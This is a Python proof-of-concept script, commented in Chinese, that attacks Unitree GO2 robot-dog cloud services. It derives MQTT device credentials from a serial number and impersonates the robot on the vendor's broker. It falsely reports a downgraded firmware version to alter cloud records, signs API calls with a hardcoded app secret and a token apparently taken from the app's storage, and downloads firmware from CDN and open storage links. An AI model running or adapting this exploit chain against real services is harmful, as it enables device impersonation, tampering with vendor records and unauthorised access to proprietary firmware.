#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GO2 OTA 固件远程获取链 PoC(改编自 R1 ota_acquire_chain.py)
=========================================================
链: 知 SN → 伪造 MQTT 令牌 → 伪报降级改云端版本记录 → 取升级清单 → CDN 直下固件

新狗: B42D4000P5Q7JK8C
Token: <访问令牌_01> doggo2 MMKV 提取的 JWT

用法:
  python go2_ota_fetch.py --sn B42D4000P5Q7JK8C --token <JWT>
  python go2_ota_fetch.py --sn B42D4000P5Q7JK8C --token <JWT> --download
  python go2_ota_fetch.py --sn B42D4000P5Q7JK8C --restore --real-version 1.1.15
"""
import sys, os, json, time, uuid, hashlib, argparse

BROKER = ('robot-mqtt.unitree.com', 17883)
API = 'https://robot-api.unitree.com/'
CDN = 'https://firmware-cdn.unitree.com'
APP_SECRET = 'XyvkwK45hp5PHfA8'

# 已知 GO2 公开 OSS 直链(无鉴权直下; 1.1.2.21 已实测 442MB 下载+解密成功)
GO2_OSS_HOSTS = ('https://unitree-firmware.oss-accelerate.aliyuncs.com/firmware/release/',
                 'https://unitree-firmware.oss-cn-hangzhou.aliyuncs.com/firmware/release/')
GO2_KNOWN_PACKAGES = [
    'package_1.0.20.0-1697620155759.upk',
    'package_1.0.21.9-1700230258299.upk',
    'package_1.1.2.21_GO2_Edu_Max_Pro_1730188258661.upk',
    'package_1.1.7.2_GO2_Edu_1747828185797.upk',
    'package_1.1.8.999_GO2_Air_1759213812822.upk',
    'package_1.1.9.102_GO2_Edu_Max_Pro_X_1760083457690.upk',
    'package_1.1.11.5_GO2_Edu_Max_Pro_X_1761128358872.upk',
]

# 从 doggo2 MMKV 提取的 JWT(2026-08-30,有效期~25天)
DEFAULT_TOKEN = "<访问令牌_01>"
DEFAULT_SN = "B42D1000Q6EDHKG7"   # 已绑定账号的 GO2(新狗 B42D4000P5Q7JK8C 未绑定,云端回 无权限)

def mqtt_token(sn):
    """MQTT 令牌公式: "1|" + md5("unitree-"+SN+"-"+nonce) + "|" + nonce"""
    nonce = uuid.uuid4().hex[:8]
    return "1|" + hashlib.md5(f"unitree-{sn}-{nonce}".encode()).hexdigest() + "|" + nonce

def publish_version(sn, version):
    """伪造设备身份接入 broker, 发布伪造 reportVersion"""
    import paho.mqtt.client as mqtt
    payload = {
        "cmd": "reportVersion",
        "modules": [
            {"hostAlias": "host1", "moduleName": "sport_mode",
             "version": "1.0.7.30", "versionFallback": ""},
        ],
        "msgId": str(int(time.time() * 1000)) + "000",
        "package": {"version": version},
        "sn": sn,
    }
    try:
        c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=sn)
    except (AttributeError, TypeError):
        c = mqtt.Client(client_id=sn)
    c.username_pw_set(username=sn, password=<密码_01>
    c.tls_set()
    c.connect(*BROKER, keepalive=15)
    c.loop_start()
    time.sleep(3)
    r = c.publish(f'msg/{sn}', json.dumps(payload))
    time.sleep(3)
    c.loop_stop(); c.disconnect()
    return r.rc

def signed_headers(token):
    """AppSign = md5(secret + ts + nonce)"""
    ts = str(int(time.time() * 1000)); nonce = uuid.uuid4().hex
    return {'Content-Type': 'application/json', 'Token': <访问令牌_01>,
            'AppTimestamp': ts, 'AppNonce': nonce,
            'AppSign': hashlib.md5((APP_SECRET + ts + nonce).encode()).hexdigest(),
            'AppName': 'B2', 'DevicePlatform': 'Android',
            'AppVersion': '2.1.2', 'channel': 'inland'}

def api_post(path, sn, token):
    from curl_cffi import requests as creq
    return creq.post(API + f'{path}?sn={sn}', headers=signed_headers(token),
                     json={}, impersonate='chrome', timeout=15).json()

def main():
    ap = argparse.ArgumentParser(description='GO2 OTA 固件远程获取链 PoC')
    ap.add_argument('--sn', default=DEFAULT_SN, help=f'设备SN(默认 {DEFAULT_SN})')
    ap.add_argument('--token', default=DEFAULT_TOKEN, help='App JWT(默认使用内置)')
    ap.add_argument('--fake-version', default='1.0.20', help='伪报版本(默认 1.0.20,触发升级推送的最低有效版本)')
    ap.add_argument('--restore', action='store_true', help='恢复版本记录后退出')
    ap.add_argument('--real-version', default='1.1.15', help='恢复时的真实版本')
    ap.add_argument('--download', action='store_true', help='直接下载固件')
    args = ap.parse_args()

    # 恢复模式
    if args.restore:
        print(f'[restore] 恢复 SN={args.sn} 版本记录为 {args.real_version}')
        rc = publish_version(args.sn, args.real_version)
        print(f'          rc={rc} (0=成功)')
        return

    # [1][2] MQTT 伪造 + 版本改写
    print(f'[1/4] 伪造 MQTT 令牌 → {BROKER[0]}:{BROKER[1]}')
    print(f'      client_id = {args.sn}')
    print(f'      username  = {args.sn}')
    print(f'      password  = <密码_01>}...')

    print(f'[2/4] 伪报版本 {args.fake_version} ...')
    rc = publish_version(args.sn, args.fake_version)
    print(f'      publish rc={rc} (0=云端已接受)')
    if rc != 0:
        print('[!] broker 拒绝, 检查 SN'); sys.exit(1)

    # [3] 验证 + 取清单
    print('[3/4] AppSign 签名查询版本记录与升级清单...')
    v = api_post('firmware/package/version', args.sn, args.token)
    code = v.get('code')
    if code in (1001, 1002):
        print(f"[!] Token 失效: {v.get('errorMsg')} (code={code})"); sys.exit(1)
    if code == 1000:
        print(f"[!] 云端拒绝: {v.get('errorMsg')} — SN 未绑定到该账号(先 APP 绑定,或用已绑定的 SN)")
        print("    本机已绑定: B42D1000Q6EDHKG7(GO2)/ E39N1000Q72DJE8G(R1)")
        sys.exit(1)
    own = v.get('data')
    print(f'      云端版本记录 = {own}')
    if str(own) != args.fake_version:
        print(f'[!] 期望 {args.fake_version}, 实际 {own} — 改写可能未生效')
    else:
        print(f'      [OK] IDOR 改写生效!')

    lst = api_post('v1/firmware/package/upgrade/list', args.sn, args.token)
    items = lst.get('data') or []
    if not items:
        url = GO2_OSS_HOSTS[0] + GO2_KNOWN_PACKAGES[-2]
        print(f"      download   = {url}")
        print('[4/4] 直接下载:')
        print(f'      curl -o firmware.upk "{url}"')
        return

    for item in items:
        url = CDN + item['download']
        print(f"      firmwareId = {item.get('firmwareId')}")
        print(f"      version    = {item.get('version')}")
        print(f"      md5        = {item.get('md5')}")
        print(f"      download   = {url}")

    if not items:
        return
    # [4] CDN 下载
    if args.download:
        import urllib.request
        for item in items:
            name = item.get('packageName', 'firmware.upk')
            size_mb = int(item.get('storageLimit', 0)) / 1e6
            print(f'[4/4] CDN 下载 {name} ({size_mb:.0f} MB) ...')
            urllib.request.urlretrieve(CDN + item['download'], name)
            md5 = hashlib.md5(open(name, 'rb').read()).hexdigest()
            ok = '一致' if md5 == item['md5'] else '不一致'
            print(f'      MD5 {md5} {ok}')
    else:
        print('[4/4] CDN 无签名直下:')
        print(f'      curl -o firmware.upk "{CDN + items[0]["download"]}"')
        print('      (加 --download 直接下载)')

    print()
    print(f'[!] 测试完恢复:')
    print(f'    python {os.path.basename(__file__)} --restore --real-version 1.1.15')

if __name__ == '__main__':
    main()
